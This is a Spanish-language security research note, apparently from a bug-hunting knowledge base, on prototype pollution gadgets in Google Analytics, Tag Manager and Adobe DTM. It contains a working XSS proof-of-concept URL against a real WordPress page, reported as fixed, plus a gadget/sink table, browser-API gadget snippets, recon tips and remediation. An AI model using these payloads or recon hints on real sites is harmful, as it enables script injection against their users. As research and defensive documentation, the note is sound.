---
clase: inyeccion
tech: google-analytics-gtm-adobe
cwe: CWE-1321
cvss: 8.1 # [derivado] XSS en el dominio del objetivo; sin CVE ni recompensa en la fuente
payload: |
  # ---- CADENA COMPLETA CONTRA UN SITIO REAL ----
  # La UNICA cadena completa del paper. URL LITERAL de la fuente:
  https://es.wordpress.org/patterns/?__proto__%5Bsequence%5D=alert%28document.domain%29-
  #
  # Decodificada: ?__proto__[sequence]=alert(document.domain)-
  #
  # EXPLICACION LITERAL de la fuente sobre el guion final:
  #   'The trailing "-" is required because the value ends up in a JavaScript
  #    expression alongside an integer.'
  # Es decir, el '-' convierte 'alert(document.domain)123' en una resta valida en lugar
  # de un error de sintaxis. Sin el, el payload no ejecuta.
  #
  # La fuente indica que ese sitio 'has now been fixed'.
  #
  # ---- GADGETS LITERALES, por producto ----
  # | propiedad            | sink                  | producto                      |
  # | hitCallback          | setTimeout            | Google Analytics              |
  # | sequence             | eval                  | Google Tag Manager            |
  # | event_callback       | setTimeout            | Google Tag Manager            |
  # | cspNonce             | innerHTML             | Adobe dynamic tag management  |
  # | bodyHiddenStyle      | innerHTML             | Adobe dynamic tag management  |
  # | trackingServerSecure | script.src            | Adobe dynamic tag management  |
  #
  # Sobre trackingServerSecure, matiz LITERAL de la fuente: 'couldn't control the
  # protocol but could control the host'.
  #
  # Codigo vulnerable de Google Analytics - LITERAL de la fuente ('c' contiene el valor
  # del gadget):
  this.Ja = function() {      !b.fb && c && setTimeout(c, 10)   }
  #
  # ---- GADGETS DE APIs DEL NAVEGADOR - LITERALES ----
  # Opciones de fetch via 'body':
  Object.prototype.body = "foo=bar";   fetch('/', {method:"POST"})
  #
  # Object.defineProperty, sin pollution (comportamiento correcto):
  let myObject = {property:"Existing property value"};   Object.defineProperty(myObject,'property', {configurable:false,writable:false} );   myObject.property = 'Should fail';   alert(myObject.property);//Existing property value
  # Con pollution de 'value' - el descriptor queda SOBRESCRITO:
  Object.prototype.value='overwritten';   let myObject = {property: "Existing property value"};   Object.defineProperty(myObject,'property', {configurable:false,writable:false});   alert(myObject.property);//overwritten!
  #
  # localStorage - acceso por propiedad frente a get():
  Object.prototype.foo = 'bar';   localStorage.get('foo');//not vulnerable   localStorage.foo//vulnerable and will return bar
precondicion: "El sitio carga uno de los scripts de terceros afectados (Google Analytics, Google Tag Manager, Adobe dynamic tag management) Y tiene una fuente de prototype pollution alcanzable. Las dos condiciones son necesarias y vienen de ORIGENES DISTINTOS: la fuente la aporta el codigo del sitio, el gadget lo aporta el tercero."
como_se_descubre: |
  Primero confirmar la fuente (ver prototype-pollution-deteccion-fuentes-cliente),
  despues comprobar que scripts de terceros carga la pagina. La combinacion de ambas
  listas es la superficie real.
  Señal de recon de alto rendimiento: cualquier sitio con GTM o Adobe DTM y un
  parametro que se fusione en un objeto. Y como el gadget vive en codigo de terceros,
  el sitio puede volverse vulnerable SIN QUE CAMBIE SU PROPIO CODIGO, simplemente
  porque el proveedor actualice su script.
  Postura de Google que la fuente documenta: respondieron que es responsabilidad del
  cliente desplegar codigo sin fuentes de prototype pollution. Esa posicion es
  relevante para el triaje: significa que el gadget no se va a corregir y que la unica
  via es cerrar la fuente.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: ?__proto__[sequence]=alert(document.domain)-   -> ejecuta
  # B: ?__proto__[sequence]=alert(document.domain)    (SIN el guion final)
  #    -> NO ejecuta: error de sintaxis al concatenarse con el entero
  # El par A/B documenta por que el guion es necesario y no decorativo. Es tambien el
  # control que explica el fallo mas comun al reproducir esta cadena.
  # C: ?__proto__[propiedad-inexistente]=x -> sin efecto; confirma que el impacto viene
  #    del gadget concreto y no de la pollution en si.
mata: |
  - El sitio no carga ninguno de los scripts de terceros afectados -> no hay gadget.
  - La fuente de pollution esta cerrada (claves saneadas con allowlist).
  - Object.freeze(Object.prototype).
  - El sitio de WordPress del ejemplo ya esta corregido segun la fuente.
  - El control C tambien ejecuta -> hay otro gadget en juego, hay que identificarlo.
fuente: "https://portswigger.net/research/widespread-prototype-pollution-gadgets (Gareth Heyes, publicado 2022-06-22, act. 2022-10-28). URL de WordPress, tabla de gadgets, codigo de Google Analytics y gadgets de APIs del navegador literales. La fuente indica que DOM Invader encontro 'multiple undocumented gadgets' en los scripts de Adobe. Sin CVE ni recompensas. jQuery, Lodash, Vue, Chart.js y Wistia NO aparecen en la fuente."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] Gadgets de prototype pollution en Google Analytics, GTM y Adobe

## Principio
La fuente del envenenamiento la aporta el código del sitio. El **gadget** lo aporta un
script de terceros. Esa separación de responsabilidades es lo que hace a esta clase
peculiar: ni el sitio ni el proveedor tienen el problema completo, y por eso ninguno lo
arregla.

## La cadena completa
La única cadena completa del paper, contra un sitio real:

```
https://es.wordpress.org/patterns/?__proto__%5Bsequence%5D=alert%28document.domain%29-
```

Decodificada: `?__proto__[sequence]=alert(document.domain)-`

El gadget es `sequence`, de Google Tag Manager, cuyo sink es `eval`.

## El guion final no es un error de copia
Explicación literal de la fuente:

> *"The trailing '-' is required because the value ends up in a JavaScript expression
> alongside an integer."*

El valor se concatena con un entero, así que `alert(document.domain)123` es un error de
sintaxis y `alert(document.domain)-123` es una resta válida. Sin el guion el payload no
ejecuta.

Merece subrayarlo porque es exactamente el tipo de detalle que se pierde al copiar un
payload de una lista, y su ausencia produce un "no funciona" que se atribuye al objetivo.

## Gadgets documentados
| Propiedad | Sink | Producto |
|---|---|---|
| `hitCallback` | `setTimeout` | Google Analytics |
| `sequence` | `eval` | Google Tag Manager |
| `event_callback` | `setTimeout` | Google Tag Manager |
| `cspNonce` | `innerHTML` | Adobe dynamic tag management |
| `bodyHiddenStyle` | `innerHTML` | Adobe dynamic tag management |
| `trackingServerSecure` | `script.src` | Adobe dynamic tag management |

Sobre el último, matiz literal: *"couldn't control the protocol but could control the
host"*.

El código vulnerable de Google Analytics, donde `c` lleva el valor del gadget:

```javascript
this.Ja = function() {      !b.fb && c && setTimeout(c, 10)   }
```

## Gadgets en las propias APIs del navegador
Tres que no dependen de ningún tercero:

```javascript
Object.prototype.body = "foo=bar";   fetch('/', {method:"POST"})
```

```javascript
Object.prototype.value='overwritten';   let myObject = {property: "Existing property value"};   Object.defineProperty(myObject,'property', {configurable:false,writable:false});   alert(myObject.property);//overwritten!
```

El segundo es notable: `Object.defineProperty` con `writable:false` existe precisamente
para hacer una propiedad inmutable, y la pollution del descriptor `value` la sobrescribe
de todos modos. Una garantía del lenguaje queda anulada.

Y el tercero, una asimetría fácil de pasar por alto:

```javascript
Object.prototype.foo = 'bar';   localStorage.get('foo');//not vulnerable   localStorage.foo//vulnerable and will return bar
```

El acceso por propiedad es vulnerable, el acceso por `get()` no.

## El problema de gobernanza
La fuente documenta que Google respondió que **es responsabilidad del cliente** desplegar
código sin fuentes de prototype pollution. Eso importa para el triaje: significa que el
gadget no se va a corregir, y que la única vía es cerrar la fuente en el sitio.

Y la consecuencia incómoda: un sitio puede volverse vulnerable **sin que cambie su propio
código**, porque el proveedor actualizó su script y añadió un gadget nuevo. Es el mismo
riesgo estructural que el principio de los gadgets de terceros en OAuth
(`writeups/auth/oauth-gadget-postmessage-origen-debil.md`).

## Impacto
Ejecución de JavaScript en el dominio del objetivo, con el payload entregado en una URL.
La fuente menciona también un *"well known game site"* no nombrado, y que DOM Invader
encontró *"multiple undocumented gadgets"* en los scripts de Adobe.

## Nota de procedencia
jQuery, Lodash, Vue, Chart.js y Wistia circulan en listas de gadgets de prototype
pollution pero **no aparecen en esta fuente**. No los incluyo.

## Remediación
Del paper: cerrar la fuente (allowlist de claves), usar objetos de prototipo nulo al
pasar objetos a APIs del navegador, y escanear toda librería buscando gadgets antes de
desplegarla. El paper considera los arreglos de gadget una medida de defensa en
profundidad, no la corrección principal.
